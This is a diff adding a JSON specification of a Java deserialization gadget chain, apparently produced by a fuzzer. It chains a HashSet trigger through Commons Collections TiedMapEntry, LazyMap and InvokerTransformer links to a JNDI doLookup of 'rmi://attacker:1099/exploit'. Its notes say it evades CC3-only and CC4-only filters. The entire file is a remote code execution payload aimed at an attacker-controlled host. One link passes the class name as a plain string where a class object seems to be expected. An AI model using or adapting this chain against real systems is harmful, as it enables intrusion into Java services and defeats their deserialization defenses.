@@ -1,0 +1,62 @@
+{
+  "chain_type": "CC_CrossLib_JNDI — CC4 TiedMapEntry + CC3 LazyMap + JNDI sink (fuzzer-discovered)",
+  "root_class": "java.util.HashSet",
+  "root_trigger": "readObject->HashMap.put->hash->TiedMapEntry.hashCode->LazyMap.get",
+  "links": [
+    {
+      "class": "org.apache.commons.collections4.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {"$ref": "link:1"},
+        "key": "defineClass"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": {},
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"},
+          {"$ref": "link:6"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "javax.naming.InitialContext"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "getMethod",
+        "iParamTypes": ["java.lang.String", "[Ljava.lang.Class;"],
+        "iArgs": ["doLookup", ["java.lang.String"]]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "invoke",
+        "iParamTypes": ["java.lang.Object", "[Ljava.lang.Object;"],
+        "iArgs": [null, ["rmi://attacker:1099/exploit"]]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": 1
+      }
+    }
+  ],
+  "sink_method": "InitialContext.doLookup",
+  "notes": "Cross-library chain: CC4 TiedMapEntry + CC3 LazyMap. Evades CC3-only and CC4-only filters. JNDI sink via doLookup static method. Discovered by web-fuzzer cross_splice mutation 2026-03-14."
+}
